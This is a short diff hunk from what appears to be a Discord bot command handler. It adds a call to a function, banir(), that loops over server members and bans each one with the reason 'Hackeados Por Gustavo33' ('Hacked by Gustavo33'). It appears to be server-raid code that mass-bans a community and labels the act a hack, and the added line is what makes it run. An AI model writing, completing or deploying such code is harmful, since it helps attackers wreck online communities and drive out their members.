@@ -4,4 +4,5 @@ exports.run = async (client, message) => {
       membros.ban("Hackeados Por Gustavo33")
     })
   }
+  banir()
 }
